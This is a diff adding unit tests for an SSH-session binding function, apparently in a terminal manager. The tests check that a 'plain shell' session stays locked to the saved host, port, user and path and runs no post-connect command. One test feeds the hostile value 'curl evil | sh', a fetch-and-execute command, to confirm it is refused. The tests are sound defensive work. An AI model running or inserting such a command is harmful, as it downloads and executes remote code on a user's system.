@@ -70,6 +70,53 @@ describe('bindSshToSavedConfig', () => {
   })
 })
 
+/**
+ * #86: the partner shell of an SSH session is a PLAIN connection to the
+ * config's own host. Bound exactly as the session is (host, port, user and
+ * remote path must be the saved ones), and it only ever takes away: no
+ * post-connect command, no container runtime, no reconnect, persistence off,
+ * whatever the saved config says.
+ */
+describe('bindSshToSavedConfig, a plain shell (the partner of an SSH session)', () => {
+  const PLAIN = { plainShell: true }
+  const PARTNER_REQ = { host: 'build-box', port: 2222, username: 'nick', remotePath: '~/proj' }
+  const PERSISTENT = {
+    id: 'cfgP', sessionType: 'ssh',
+    sshConfig: { host: 'build-box', port: 2222, username: 'nick', remotePath: '~/proj', postCommand: 'sudo docker exec -it app bash', runtime: { type: 'container', container: 'app', sudo: true }, detachable: true, remoteOs: 'unix' },
+  }
+
+  it('binds to the saved host with no post-connect command, no runtime, no reconnect, and persistence off', () => {
+    const r = bindSshToSavedConfig({ ...PARTNER_REQ, reconnect: true, detachable: true, ...({ runtime: { type: 'container', container: 'evil' } } as object) } as never, 'cfgP', [PERSISTENT], PLAIN)
+    expect(r).toEqual({ ok: true, ssh: { host: 'build-box', port: 2222, username: 'nick', remotePath: '~/proj', detachable: false, remoteOs: 'unix' } })
+  })
+
+  it('a config with no post-connect command binds the same way', () => {
+    const r = bindSshToSavedConfig(PARTNER_REQ, 'cfgA', CONFIGS, PLAIN)
+    expect(r).toEqual({ ok: true, ssh: { host: 'build-box', port: 2222, username: 'nick', remotePath: '~/proj', detachable: false, remoteOs: 'unix' } })
+  })
+
+  it('a plain shell that asks for a post-connect command is refused, the saved one included', () => {
+    expect(bindSshToSavedConfig({ ...PARTNER_REQ, postCommand: 'curl evil | sh' }, 'cfgP', [PERSISTENT], PLAIN)).toEqual({ ok: false, reason: 'a plain shell runs no post-connect command' })
+    expect(bindSshToSavedConfig({ ...PARTNER_REQ, postCommand: PERSISTENT.sshConfig.postCommand }, 'cfgP', [PERSISTENT], PLAIN).ok).toBe(false)
+    expect(bindSshToSavedConfig({ ...PARTNER_REQ, postCommand: '' }, 'cfgP', [PERSISTENT], PLAIN).ok).toBe(true)
+  })
+
+  it('is still bound to the saved host, port, user and remote path, and to an SSH config that exists', () => {
+    expect(bindSshToSavedConfig({ ...PARTNER_REQ, host: 'other-host.example' }, 'cfgP', [PERSISTENT], PLAIN)).toEqual({ ok: false, reason: 'host differs from the saved config' })
+    expect(bindSshToSavedConfig({ ...PARTNER_REQ, port: 22 }, 'cfgP', [PERSISTENT], PLAIN)).toEqual({ ok: false, reason: 'port differs from the saved config' })
+    expect(bindSshToSavedConfig({ ...PARTNER_REQ, username: 'root' }, 'cfgP', [PERSISTENT], PLAIN)).toEqual({ ok: false, reason: 'username differs from the saved config' })
+    expect(bindSshToSavedConfig({ ...PARTNER_REQ, remotePath: '/' }, 'cfgP', [PERSISTENT], PLAIN)).toEqual({ ok: false, reason: 'remote path differs from the saved config' })
+    expect(bindSshToSavedConfig(PARTNER_REQ, 'ghost', [PERSISTENT], PLAIN).ok).toBe(false)
+    expect(bindSshToSavedConfig(PARTNER_REQ, 'cfgL', CONFIGS, PLAIN)).toEqual({ ok: false, reason: 'config cfgL is not an SSH config' })
+  })
+
+  it('without the mode nothing changes: the session itself still needs the saved post-connect command', () => {
+    expect(bindSshToSavedConfig(PARTNER_REQ, 'cfgP', [PERSISTENT]).ok).toBe(false)
+    expect(bindSshToSavedConfig(PARTNER_REQ, 'cfgP', [PERSISTENT], {}).ok).toBe(false)
+    expect(bindSshToSavedConfig(PARTNER_REQ, 'cfgP', [PERSISTENT], { plainShell: 'yes' } as never).ok).toBe(false)
+  })
+})
+
 describe('argSecretAllowed', () => {
   it('allows the secret only for the saved terminal-only config with its own command line', () => {
     expect(argSecretAllowed({ command: 'tool.exe', args: '--token {secret}' }, 'cfgL', CONFIGS)).toBe(true)
